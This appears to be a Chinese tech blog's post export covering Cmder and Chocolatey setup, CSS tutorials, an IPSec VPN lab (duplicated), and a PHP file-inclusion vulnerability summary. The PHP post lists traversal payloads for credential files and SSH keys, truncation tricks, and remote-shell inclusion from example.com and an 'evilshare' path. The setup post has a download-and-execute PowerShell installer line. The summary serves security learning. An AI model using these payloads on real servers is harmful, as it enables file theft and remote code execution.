    <content type="text"><![CDATA[Cmder 是一款 windows 环境下非常简洁美观易用轻量的 cmd 替代者,它支持了大部分的 Liunx 命令Cmder 介绍Cmder 官网（它把 conemu,msysgit 和 clink 打包在一起,让你无需配置就能使用一个真正干净的 Linux 终端！它甚至还附带了漂亮的 monokai 配色主题。）;作为一个压缩档的存在, 可即压即用。你甚至可以放到 USB 就可以虽时带着走,连调整过的设定都会放在这个目录下,不会用到系统机码(Registry),所以也很适合放在 Dropbox / Google Drive / OneDrive 共享于多台电脑。安装 Cmder推荐去官网下载：Cmder 官网下载的时候,有两个版本,分别是 mini 与 full 版；唯一的差别在于有没有内建 msysgit 工具,这是 Git for Windows 的标准配备；全安装版 Cmder 自带了 msysgit,除了 git 本身这个命令之外, 里面可以使用大量的 linux 命令；比如 grep, curl(没有 wget);像 vim, grep, tar, unzip, ssh, ls, bash, perl 等。可能需要翻墙,这里提供另外的下载地址cmder.zip cmder_mini.zip可能提 api-ms-crt-runtime安装一些运行库 MSVBCRT_AIO.7zCmder 元件组成Cmder 其实结合了多套软体,其中包括 msysgit 与最重要的 ConEmu 与 Clink 软体,而 ConEmu 与 Clink 这两套软体就是 Cmder 真正的核心元件。msysgit 除了提供 Git for Windows 相关工具外,其实还提供了多套 Unix/Linux 环境下常用的指令列工具,例如 less, ls, tar, unzip, md5sum, grep, sed, … 等多套工具。光是一个 grep 就不知道比 Windows 内建的 findstr 强几百倍了！ConEmu 也可以是单独一款软件存在,曾经一度迷恋于它,然而其体验并不如 cmder,便放弃它了。Clink 将 GNU Readline 函式库整合进原生的 Windows 命令提示字元视窗,提供命令列模式下强大的编辑与输入能力,这也是用了 Cmder 之后会这么像在 Linux 环境下使用的感觉。配置 Cmder启动 Cmder因为它是即压即用的存在,所以点击 Cmder.exe 即可运行。很显然这般打开它,不怎么快捷,即便用 Listary 高效搜索到它,然后点击也是很麻烦的;我们可以这样做:把 Cmder 加到环境变量可以把 Cmder.exe 存放的目录添加到系统环境变量；加完之后,Win+r 一下输入 cmder,即可添加 Cmder 到右键菜单在某个文件夹中打开终端, 这个是一个(超级)痛点需求, 实际上上一步的把 Cmder 加到环境变量就是为此服务的, 在管理员权限的终端输入以下语句即可: Cmder.exe /REGISTER ALL打开一个管理员权限终端在任意一个 Cmder 窗口输入 Ctrl+t, 或者在 Cmder 窗口中点击下方控制条的绿色加号, 勾选 Run as administrator设置命令的别名la=ls -aF --show-control-chars --color ll=ls -alF --show-control-chars --color ls=ls --show-control-chars -F --color 添加至 cmder/config/user-aliases.cmd 文件末尾修改命令提示符号Cmder 预设的命列列提示符号是 λ;如果用着不习惯,可以将这个字元改成 Mac/Linux环境下常见的 $ 符号,具体操作如下：编辑 Cmder 安装目录下的 vendor\clink.lua 批处理文件(min 版本 15 行,full 版本 41 行),把：local cmder_prompt = &quot;\x1b[1;32;40m{cwd} {git}{hg} \n\x1b[1;30;40m{lamb} \x1b[0m&quot; 修改成local cmder_prompt = &quot;\x1b[1;32;40m{cwd} {git}{hg} \n\x1b[1;30;40m$ \x1b[0m&quot; 其实就是将 {lamb} 替换成 $ 就好Chocolatey 软件包管理系统在 Linux 下,大家喜欢用 apt-get(mac 下用 brew) 来安装应用程序,如今在 windows 下,大家可以使用 Chocolatey 来快速下载搭建一个开发环境。Chocolatey 的哲学就是完全用命令行来安装应用程序, 它更像一个包管理工具（背后使用 Nuget ）另外需要说明的是, Chocolatey 只是把官方下载路径封装到了 Chocolatey 中,所以下载源都是其官方路径,所以下载的一定是合法的,但是如果原软件是需要 Licence 注册的话,那么 Chocolatey 下载安装好的软件还是需要你去购买注册。不过 Chocolatey 一般还是会选用免费 Licence 可用的软件。安装 chocolatey运行如下命令即可(需要管理员权限)：@powershell -NoProfile -ExecutionPolicy unrestricted -Command &quot;iex ((new-object net.webclient).DownloadString(&#39;https://chocolatey.org/install.ps1&#39;))&quot; &amp;&amp; SET PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin 出现 Chocolatey (choco.exe) is now ready. 字样表示安装成功choco 安装软件安装软件命令 choco install softwareName, 短写是 cinst softwareName可安装的应用程序,默认安装在 C:\Program Files\,可以参见其 Package 列表以下是 window 下开发常用的开发环境应用:choco install autohotkey.portable #安装 AutoHotkey (Portable) choco install nodejs.install #安装 node choco install git.install #安装 git choco install ruby #安装 ruby choco install python #安装 python choco install jdk8 #安装 JDK8 choco install googlechrome #安装 Chrome choco install google-chrome-x64 #Google Chrome (64-bit only) choco install firefox #安装 firefox choco install notepadplusplus.install #安装 notepad++ choco install Atom #安装 Atom choco install SublimeText3 #安装 SublimeText3 快捷键可以利用 Tab,自动路径补全 打开设置面板 =&gt; Win+Alt+P 打开新的页签 =&gt; Ctrl+T 关闭页签 =&gt; Ctrl+W 切换页签 =&gt; Ctrl+Tab 关闭所有页签 =&gt; Alt+F4 快速打开一个 CMD =&gt; Shift+Alt+1 快速打开一个 PowerShell =&gt; Shift+Alt+2 快速打开一个 PowerShell(系统管理员权限) =&gt; Shift+Alt+2 快速切换到第 1 个页签 =&gt; Ctrl+1 快速切换到第 n 个页签(n 值无上限) =&gt; Ctrl+n 历史命令搜索 =&gt; Ctr+r 全屏 =&gt; Alt+Enter另一个重量级工具cygwin 官网此工具非常庞大,其实就是将 Liunx 上的命令转换成 windows 上可执行的 exe 程序,同时还会在真机上装一个 Liunx 系统,占用磁盘大小就在于你装了几个命令,虽然不推介使用,但是喜欢折腾的童鞋可以去官网上将其下载下来。]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>Command</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 文件包含漏洞总结]]></title>
    <url>%2Farchives%2Fc09aa989.html</url>
    <content type="text"><![CDATA[PHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时,由于传入的文件名没有经过合理的校验,从而操作了预想之外的文件,就可能导致意外的文件泄露甚至恶意的代码注入常见文件包含函数include()：执行到 include 时才包含文件,找不到被包含文件时只会产生警告,脚本将继续执行require()：只要程序一运行就包含文件,找不到被包含的文件时会产生致命错误,并停止脚本include_once()和require_once()：若文件中代码已被包含则不会再次包含利用条件程序用 include() 等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量注：PHP 中只要文件内容符合 PHP 语法规范,包含时不管扩展名是什么都会被 PHP 解析, 若文件内容不符合 PHP 语法规范则会暴漏其源码。漏洞危害执行任意代码包含恶意文件控制网站甚至控制服务器漏洞分类本地文件包含：可以包含本地文件,在条件允许时甚至能执行代码上传图片马,然后包含读敏感文件,读 PHP 文件包含日志文件 GetShell包含 /proc/self/envion 文件 GetShell包含 data: 或 php://input 等伪协议若有 phpinfo 则可以包含临时文件远程文件包含：可以直接执行任意代码要保证 php.ini 中 allow_url_fopen 和 allow_url_include 要为 On普通本地文件包含&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;]);?&gt; 攻击方式包含同目录下的文件?file=.htaccess目录遍历?file=../../../../../../../../../var/lib/locate.db?file=../../../../../../../../../var/lib/mlocate/mlocate.db(linux 中这两个文件储存着所有文件的路径,需要 root 权限)包含错误日志?file=../../../../../../../../../var/log/apache/error.log获取 web 目录或者其他配置文件?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf包含上传的附件?file=../attachment/media/xxx.file读取 session 文件?file=../../../../../../tmp/sesstnrdo9ub2tsdurntv0pdir1no7(session 文件一般在 /tmp 目录下,格式为 `sess\[your phpsessid value]`,有时候也有可能在/var/lib/php5 之类的,在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制 session 的值,也许你能够获得一个 shell)系统中重要文件(需要 root 权限)/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_rsa.keystore/root/.ssh/id_rsa.pub/root/.ssh/known_hosts/etc/shadow/root/.bash_history/root/.mysql_history/proc/self/fd/fd[0-9]* (文件标识符)/proc/mounts/proc/config.gz有限制的本地文件包含&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;] . &quot;.htm&quot;);?&gt; 攻击方式%00 截断?file=../../../../../../../../../etc/passwd%00(需要 magic_quotes_gpc=off,PHP 小于 5.3.4 有效)%00 截断目录遍历?file=../../../../../../../../../var/www/%00(需要 magic_quotes_gpc=off,unix 文件系统,比如 FreeBSD,OpenBSD,NetBSD,Solaris)路径长度截断：?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.(php 版本小于 5.2.8(?)可以成功,linux 需要文件名长于 4096,windows 需要长于 256)点号截断：?file=../../../../../../../../../boot.ini/………[…]…………(php 版本小于 5.2.8(?)可以成功,只适用 windows,点号需要长于 256)普通远程文件包含&lt;?php include($_GET[&#39;file&#39;]);?&gt; 攻击方式远程代码执行：?file=[http|https|ftp]\://example.com/shell.txt(需要 allow_url_fopen=On 并且 allow_url_include=On)利用 php 流 input：?file=php://input(需要 allow_url_include=On)利用 php 流 filter：?file=php://filter/convert.base64-encode/resource=index.php(需要 allow_url_include=On)利用 data URIs：?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=(需要 allow_url_include=On)利用 XSS 执行任意代码：?file=http://127.0.0.1/path/xss.php?xss=phpcode(需要 allow_url_fopen=On,allow_url_include=On 并且防火墙或者白名单不允许访问外网时,先在同站点找一个 XSS 漏洞,包含这个页面,就可以注入恶意代码了。条件非常极端和特殊- -)有限制的远程文件包含&lt;?php include($_GET[&#39;file&#39;] . &quot;.htm&quot;);?&gt; ?file=http://example.com/shell?file=http://example.com/shell.txt??file=http://example.com/shell.txt%23(需要 allow_url_fopen=On 并且 allow_url_include=On)?file=\evilshare\shell.php (只需要 allow_url_include=On)延伸其实在前面也说了,这些漏洞产生原因是 PHP 函数在引入文件时,传入的文件名没有经过合理的校验,从而操作了预想之外的文件。实际上我们操作文件的函数不只是 include()一个,上面提到的一些截断的方法同样可以适用于以下函数：fopenfile_get_contentscopyparse_ini_filereadfilefile_put_contentsmkdirtempnammove_uploaded_filerenameunlinkrmdirrequirerequire_onceinclude_onceZipArchive::open()漏洞防御PHP 中使用 open_basedir 配置,将访问限制在指定区域过滤 ./\禁止服务器远程文件包含]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS 的新特性]]></title>
    <url>%2Farchives%2Ffd833805.html</url>
    <content type="text"><![CDATA[在众多的 CSS 新特性中, 有 3 个采用的新特性值得我们一起学习, 这里将记录这些新特性的使用方法特性查询特性查询, 使用 @supports 规则, 允许我们将 CSS 包含在一个条件块中, 这个条件块中会检查当前 user agent 是否支持一个 CSS 属性键值对, 在支持的情况下其中的内容才会生效。这里有一个简单的例子, 只在浏览器支持 Flexbox 的时候应用 display: flex@supports (display: flex) { .foo { display: flex; } } 另外, 使用像 and 和 not 这样的运算符, 我们甚至可以创建更复杂的特性查询。比如, 我们可以检测浏览器是否仅仅支持老的 Flexbox 语法 -@supports (display: flexbox) and (not ( display: flex )) { .foo { display: flexbox; } } 支持情况表格布局CSS 表格布局模块 所定义的系统用于创建基于表格的布局。 它与 弹性盒布局 模块相似, 但它更明确地为页面布局而设计, 它们之间存在许多不同的特性。明确项目定位网格由表格容器(通过 display: grid 创建)和表格项(子组件)组成。 在我们的 CSS 中, 我们可以清楚的组织表格项的位置和顺序, 而这与它们的标记(指 HTML 标记)无关。像上面这张图的布局, 它的背后的 CSS 代码是非常简单的.hg__header { grid-area: header; } .hg__footer { grid-area: footer; } .hg__main { grid-area: main; } .hg__left { grid-area: navigation; } .hg__right { grid-area: ads; } .hg { display: grid; grid-template-areas: &quot;header header header&quot; &quot;navigation main ads&quot; &quot;footer footer footer&quot;; grid-template-columns: 150px 1fr 150px; grid-template-rows: 100px 1fr 30px; min-height: 100vh; } @media screen and (max-width: 600px) { .hg { grid-template-areas: &quot;header&quot; &quot;navigation&quot; &quot;main&quot; &quot;ads&quot; &quot;footer&quot;; grid-template-columns: 100%; grid-template-rows: 100px 50px 1fr 50px 30px; } } 灵活的长度CSS Grid 模块引入了一个新的长度单位, fr , 它代表了表格容器中剩余空间的一个等分。它使得我们在表格容器根据可用空间来为表格项分配高度和宽度成为可能。 例如在圣杯布局( Holy Grail Layout )中, 我希望 main 分区占据两个边栏之外的所有空间。.hg { grid-template-columns: 150px 1fr 150px; } 间距我们可以使用 grid-row-gap 、 grid-column-gap 和 grid-gap 属性来明确定义间距。 这些属性的值是 &lt;length-percentage(长度百分比)&gt; 数据类型 , 是内容区域尺寸的百分比。比如, 需要 %5 的间距, 可以这样写.hg { display: grid; grid-column-gap: 5%; } 支持情况原生变量最后要说的是原生 CSS 变量。 这个模块引入了一种由创建作者定义变量的方法, 这个变量可以像 CSS 属性一样赋值。比如, 假设在我们的样式表中多处用到一个主题颜色, 我们可以将其抽象出来保存到变量中, 再引用变量, 以此代替多次直接写出实际的值。:root { --theme-colour: cornflowerblue; } h1 { color: var(--theme-colour); } a { color: var(--theme-colour); } strong { color: var(--theme-colour); } 目前在像 SASS 这样 CSS 预处理器中已经可以做到这些事情, 但 CSS 变量在浏览器中具有活性。 也就是说, 它们的值可以实时更新。 例如, 要改变上例中 --theme-color 属性的值, 我们只需要这样做const rootEl = document.documentElement; rootEl.style.setProperty(&quot;--theme-colour&quot;, &quot;plum&quot;); 支持情况]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS 选择器介绍]]></title>
    <url>%2Farchives%2Fe00b3071.html</url>
    <content type="text"><![CDATA[CSS 选择器是 WEB 开发中一个重要部分, 通过 CSS 选择器, 可以提高开发人员的工作效率。 在本篇文章中将介绍属性选择器和伪类选择器的基本用法属性选择器(字符串匹配)属性选择器其主要作用是为待遇制定属性的 HTML 元素设置样式。 例如, 通过制定 div 元素的 id 属性, 设置相关样式属性选择器一共分为 4 种匹配模式选择器：完全匹配属性选择器包含匹配选择器首字符匹配选择器尾字符匹配选择器完全匹配属性选择器其含义就是完全匹配字符串。 当 div 元素的 id 属性值为 test 时, 利用完全匹配选择器选择任何 id 值 为 test 的元素都使用该样式。 如下代码通过指定 id 值将属性设定为红色字体：&lt;div id=&quot;article&quot;&gt;测试完全匹配属性选择器&lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; [id=article] { color: red; } &lt;/style&gt; 包含匹配选择器包含匹配比完全匹配范围更广。 只要元素中的属性包含有指定的字符串, 元素就使用该样式。其语法是： [attribute*=value] 。 其中 attribute 指的是属性名, value 指的是属性值, 包含匹配采用 “*=” 符号。例如下三个 div 元素都符合匹配选择器的选择, 并将 div 元素内的字体设置为红色字体：&lt;div id=&quot;article&quot;&gt;测试包含匹配属性选择器&lt;/div&gt; &lt;div id=&quot;subarticle&quot;&gt;测试包含匹配属性选择器&lt;/div&gt; &lt;div id=&quot;article1&quot;&gt;测试包含匹配属性选择器&lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; [id*=article] { color: red; } &lt;/style&gt; 首字符匹配选择器首字符匹配就是匹配属性值开头字符, 只要开头字符符合匹配, 则元素使用该样式。其语法是： [attribute^=value] 。 其中 attribute 指的是属性名, value 指的是属性值, 包含匹配采用 “^=” 符号。例如下三个 div 元素使用首字符匹配选择器后, 只有 id 为 article 和 article1 的元素才被设置为红色字体：&lt;div id=&quot;article&quot;&gt;测试首字符匹配选择器&lt;/div&gt; &lt;div id=&quot;subarticle&quot;&gt;测试首字符匹配选择器&lt;/div&gt; &lt;div id=&quot;article1&quot;&gt;测试首字符匹配选择器&lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; [id^=article] { color: red; } &lt;/style&gt; 尾字符匹配选择器尾子符匹配跟首字符匹配原理一样。 尾子符只匹配结尾的字符串, 只要结尾字符串符合匹配, 则元素使用该样式。其语法是： [attribute$=value] 。 其中 attribute 指的是属性名, value 指的是属性值, 包含匹配采用 “$=” 符号。例如下三个 div 元素使用首字符匹配选择器后, 只有 id 为 article 和 subarticle 的元素才被设置为红色字体：&lt;div id=&quot;article&quot;&gt;测试首字符匹配选择器&lt;/div&gt; &lt;div id=&quot;subarticle&quot;&gt;测试首字符匹配选择器&lt;/div&gt; &lt;div id=&quot;article1&quot;&gt;测试首字符匹配选择器&lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; [id$=article] { color: red; } &lt;/style&gt; 属性选择器（包含匹配）[attr]匹配 html 属性, 可自定义属性&lt;div flex&gt;测试&lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; [flex] { display: flex; } &lt;/style&gt; [attr=val]属性值一定只能等于某个字符串&lt;div flex=&quot;inline&quot;&gt;测试&lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; [flex=&quot;inline&quot;] { display: inline-flex; } &lt;/style&gt; [attr~=val]属性值包含其中一个字符串&lt;div flex=&quot;dir:left&quot;&gt;测试&lt;/div&gt; &lt;div flex=&quot;dir:left main:center&quot;&gt;测试&lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; [flex] { display: flex; } [flex~=&#39;dir:left&#39;] { flex-direction: row; } [flex~=&#39;main:center&#39;] { justify-content: center; } &lt;/style&gt; [attr|=val]属性值只能匹配以 - 分割的字符串&lt;div id=&quot;line-1-2&quot;&gt;测试&lt;/div&gt; &lt;div id=&quot;line-1-4&quot;&gt;测试&lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; [id|=&#39;line-1&#39;] { display: flex; } &lt;/style&gt; 后代选择器&lt;div class=&quot;content&quot;&gt; &lt;p&gt;测试&lt;/p&gt; &lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; .content p { color: red; } &lt;/style&gt; 并列选择器&lt;div class=&quot;content&quot;&gt; &lt;p&gt;测试&lt;/p&gt; &lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; .content, p { font-size: 16px; } &lt;/style&gt; 子元素选择器范围比后代选择器小, 只选中直系子元素&lt;div class=&quot;content&quot;&gt; &lt;div&gt; 测试 &lt;div class=&quot;test&quot;&gt;测试2&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; .test { color: red; line-height: 12px; font-size: 12px; } .content&gt;div { font-size: 20px; } &lt;/style&gt; 相邻兄弟选择器&lt;div class=&quot;content&quot;&gt; &lt;div&gt; 测试 &lt;div class=&quot;test&quot;&gt;测试2&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;content2&quot;&gt; 测试3 &lt;/div&gt; &lt;style type=&quot;text/css&quot;&gt; .content+.content2 { font-size: 20px; } &lt;/style&gt; 伪类选择器在 CSS3 选择器中, 伪类选择器种类非常多。 然后在 CSS2.1 时代, 伪类选择器就已经存在, 例如超链接的四个状态选择器： a:link 、 a:visited 、 a:hover 、 a:active 。a:link =&gt; 指普通的、 未被访问的链接a:visited =&gt; 指用户已访问的链接a:hover =&gt; 表示鼠标悬停在链接上方a:active =&gt; 链接被点击时刻CSS3 增加了非常多的选择器, 其中包括：first-line 伪元素选择器first-letter 伪元素选择器not 选择器root 选择器empty 选择器target 选择器focusfoucus 伪类元素选择器用于选取获得焦点的元素input:focus { background-color: yellow; } first-child指定元素列表中第一个元素的样式。 语法如下：li:first-child { color: red; } last-child和 first-child 是同类型的选择器。 last-child 指定元素列表中最后一个元素的样式。 语法如下：li:last-child { color: red; } nth-child 和 nth-last-childnth-child 和 nth-last-child 可以指定某个元素的样式或者从后数起某个元素的样式。 例如：// 指定第 2 个元素 li:nth-child(2) { } // 指定倒数第 2 个元素 li:nth-last-child(2) { } // 指定偶数个元素 li:nth-child(even) { } // 指定奇数个元素 li:nth-child(odd) { } 伪元素选择器before 选择器before 伪类元素选择器主要作用是在选择某个元素之前插入内容, 一般用于清除浮动。目前, before 选择器得到支持的浏览器包括： IE8+ 、 Firefox 、 Chrome 、 Safari 、 Opera 、 Android Browser 、 iOS Safari 。befor 选择器的语法是：元素标签:before { content: &quot;插入内容&quot;; } 例如, 在 p 元素之前插入 “文字”：p:before { content: &quot;文字&quot;; } afterafter 伪类元素选择器和 before 伪类元素选择器原理一样, 但 after 是在选择某个元素之后插入内容。目前, before 选择器得到支持的浏览器包括： IE8+ 、 Firefox 、 Chrome 、 Safari 、 Opera 、 Android Browser 、 iOS Safari 。after 选择器的语法是：元素标签:after { content: &quot;插入内容&quot;; } 例如, 在 p 元素之后插入 “文字”：p:after { content: &quot;文字&quot;; } first-letterfirst-letter 可以选中首字符&lt;p&gt;测试测试&lt;/p&gt; &lt;style type=&quot;text/css&quot;&gt; p:first-letter { font-size: 200%; color: #dedede; } &lt;/style&gt; first-linefirst-line 可以选中首行&lt;p&gt;测试测试&lt;/p&gt; &lt;style type=&quot;text/css&quot;&gt; p:first-line { background-color: #dedede; } &lt;/style&gt;]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPSec VPN 的配置]]></title>
    <url>%2Farchives%2F4030be2e.html</url>
    <content type="text"><![CDATA[IPSec VPN 指采用 IPSec 协议来实现远程接入的一种 VPN 技术, 本篇文章介绍在虚拟机下搭建 IPSec VPN 的全过程（使用 L2TP 连接方式）环境需求以下实验机全为虚拟机环境。注意： 外网 IP 地址段： 20.1.1.0 内网 IP 地址段： 10.1.1.0 VPN 地址池： 10.1.1.100~10.1.1.200虚拟环境VPN 客户机要求：Windows 系统为： Windows XP网络适配器连至 VMnet2 , IP 地址配置为： 20.1.1.2作用：作为 VPN 客户端连接 VPN 服务器提供的 VPN 服务作为 CA 客户端, 向 CA 服务器申请 CA 客户端证书VPN 服务器要求：Windows 系统为： Windows 2003网络适配器连至 VMnet2 , IP 地址配置为： 20.1.1.1网络适配器连至 VMnet1 , IP 地址配置为： 10.1.1.1作用：作为 VPN 服务器为 VPN 客户端提供 VPN 服务作为 VPN 服务器向 CA 服务器申请 IPSec 证书CA 服务器要求：Windows 系统为： Windows 2003网络适配器连至 VMnet1 , IP 地址配置为： 10.1.1.2作用：作为 CA 服务器搭建 CA 服务作为 CA 服务器向 VPN 客户端和 VPN 服务端颁发相关证书网络连通性需保证 VPN 服务器的 VMnet1 可以 ping 通 CA 服务器的 VMnet1需保证 VPN 客户端的 VMnet2 可以 ping 通 VPN 服务器的 VMnet2需保证 VPN 客户端的 VMnet2 不可以 ping 通 CA 服务器的 VMnet1VPN 服务器搭建 VPN 服务创建 VPN 用户创建 VPN 用户： user, 设置其远程访问权限（拨入或 VPN）为通过远程访问策略控制访问创建组： vpn, 将用户 user 加入 vpn 组开启 VPN 服务开启路由和远程访问开启路由和远程访问启用远程访问（拨号或 VPN）选择远程访问方式为 VPN选择连接外网接口选择连接外网接口配置 VPN 地址池配置 VPN 地址池VPN 地址池配置为： 10.1.1.100~10.1.1.200配置身份验证方式并完成配置配置身份验证方式完成配置新建远程访问策略新建远程访问策略自定义策略添加策略并保存允许特殊时间段内才能访问允许规定用户组才能访问授予远程访问权限完成向导网络连通性此时 VPN 客户端的 VMnet2 不可以 ping 通 VPN 服务器的 VMnet2 和 CA 服务器的 VMnet1VPN 客户端连接 VPN 服务器新建一个连接新建一个连接设置连接类型使用 VPN 连接配置连接的 IP 地址使用 VPN 账户连接 VPN 服务器连接 VPN 服务器此时的 VPN 连接状态为 PPTP此时的 IP 地址配置情况网络连通性此时 VPN 客户端的 VMnet2 可以 ping 通 VPN 服务器的 VMnet1 和 CA 服务器的 VMnet1此时 VPN 客户端的 VMnet2 不可以 ping 通 VPN 服务器的 VMnet2CA 服务器搭建 CA 服务开启 IIS 服务开启 IIS 服务开启 ASP 配置完成配置安装 CA 证书服务安装 CA 证书服务CA 类型为独立根 CA完成安装, 本地访问测试VPN 服务器向 CA 服务器申请 IPSec 证书申请 IPSec 证书提交一个高级证书申请申请 IPSec 证书, 并将证书保存在本地计算机储存中申请成功CA 服务器颁布 IPSec 证书颁布 IPSec 证书VPN 服务器安装导入 IPSec 证书查看挂起的证书并安装查看挂起的证书选择 IPSec 证书并安装安装成功下载证书并导入下载证书下载 IPSec 证书和证书链将证书和证书链导入受信任的证书颁发机构(计算机)中证书导入成功显示证书链导入成功显示VPN 客户机向 CA 服务器申请客户端证书申请客户端证书提交一个高级证书申请申请 IPSec 证书, 并将证书保存在本地计算机储存中申请成功CA 服务器颁布客户端证书器颁布客户端证书VPN 客户端安装导入客户端证书查看挂起的证书并安装查看挂起的证书选择客户端证书并安装安装成功下载证书并导入下载证书下载客户端证书和证书链将证书和证书链导入受信任的证书颁发机构(计算机)中证书导入成功显示证书链导入成功显示VPN 客户端使用 L2TP 方式连接 VPN连接 VPN此时的 VPN 连接状态为 L2TPauthor: 星火燎原@vxhly title: IPSec VPN 的配置 date: 2017-03-02T10:02:33.000Z categories:windows tags:SecurityServiceIPSec VPN 指采用 IPSec 协议来实现远程接入的一种 VPN 技术, 本篇文章介绍在虚拟机下搭建 IPSec VPN 的全过程（使用 L2TP 连接方式）环境需求以下实验机全为虚拟机环境。注意： 外网 IP 地址段： 20.1.1.0 内网 IP 地址段： 10.1.1.0 VPN 地址池： 10.1.1.100~10.1.1.200虚拟环境VPN 客户机要求：Windows 系统为： Windows XP网络适配器连至 VMnet2 , IP 地址配置为： 20.1.1.2作用：作为 VPN 客户端连接 VPN 服务器提供的 VPN 服务作为 CA 客户端, 向 CA 服务器申请 CA 客户端证书VPN 服务器要求：Windows 系统为： Windows 2003网络适配器连至 VMnet2 , IP 地址配置为： 20.1.1.1网络适配器连至 VMnet1 , IP 地址配置为： 10.1.1.1作用：作为 VPN 服务器为 VPN 客户端提供 VPN 服务作为 VPN 服务器向 CA 服务器申请 IPSec 证书CA 服务器要求：Windows 系统为： Windows 2003网络适配器连至 VMnet1 , IP 地址配置为： 10.1.1.2作用：作为 CA 服务器搭建 CA 服务作为 CA 服务器向 VPN 客户端和 VPN 服务端颁发相关证书网络连通性需保证 VPN 服务器的 VMnet1 可以 ping 通 CA 服务器的 VMnet1需保证 VPN 客户端的 VMnet2 可以 ping 通 VPN 服务器的 VMnet2需保证 VPN 客户端的 VMnet2 不可以 ping 通 CA 服务器的 VMnet1VPN 服务器搭建 VPN 服务创建 VPN 用户创建 VPN 用户： user, 设置其远程访问权限（拨入或 VPN）为通过远程访问策略控制访问创建组： vpn, 将用户 user 加入 vpn 组开启 VPN 服务开启路由和远程访问开启路由和远程访问启用远程访问（拨号或 VPN）选择远程访问方式为 VPN选择连接外网接口选择连接外网接口配置 VPN 地址池配置 VPN 地址池VPN 地址池配置为： 10.1.1.100~10.1.1.200配置身份验证方式并完成配置配置身份验证方式完成配置新建远程访问策略新建远程访问策略自定义策略添加策略并保存允许特殊时间段内才能访问允许规定用户组才能访问授予远程访问权限完成向导网络连通性此时 VPN 客户端的 VMnet2 不可以 ping 通 VPN 服务器的 VMnet2 和 CA 服务器的 VMnet1VPN 客户端连接 VPN 服务器新建一个连接新建一个连接设置连接类型使用 VPN 连接配置连接的 IP 地址使用 VPN 账户连接 VPN 服务器连接 VPN 服务器此时的 VPN 连接状态为 PPTP此时的 IP 地址配置情况网络连通性此时 VPN 客户端的 VMnet2 可以 ping 通 VPN 服务器的 VMnet1 和 CA 服务器的 VMnet1此时 VPN 客户端的 VMnet2 不可以 ping 通 VPN 服务器的 VMnet2CA 服务器搭建 CA 服务开启 IIS 服务开启 IIS 服务开启 ASP 配置完成配置安装 CA 证书服务安装 CA 证书服务CA 类型为独立根 CA完成安装, 本地访问测试VPN 服务器向 CA 服务器申请 IPSec 证书申请 IPSec 证书提交一个高级证书申请申请 IPSec 证书, 并将证书保存在本地计算机储存中申请成功CA 服务器颁布 IPSec 证书颁布 IPSec 证书VPN 服务器安装导入 IPSec 证书查看挂起的证书并安装查看挂起的证书选择 IPSec 证书并安装安装成功下载证书并导入下载证书下载 IPSec 证书和证书链将证书和证书链导入受信任的证书颁发机构(计算机)中证书导入成功显示证书链导入成功显示VPN 客户机向 CA 服务器申请客户端证书申请客户端证书提交一个高级证书申请申请 IPSec 证书, 并将证书保存在本地计算机储存中申请成功CA 服务器颁布客户端证书器颁布客户端证书VPN 客户端安装导入客户端证书查看挂起的证书并安装查看挂起的证书选择客户端证书并安装安装成功下载证书并导入下载证书下载客户端证书和证书链将证书和证书链导入受信任的证书颁发机构(计算机)中证书导入成功显示证书链导入成功显示VPN 客户端使用 L2TP 方式连接 VPN连接 VPN此时的 VPN 连接状态为 L2TP]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7 种新型的 CSS 长度单位]]></title>
    <url>%2Farchives%2Fbd3100fb.html</url>
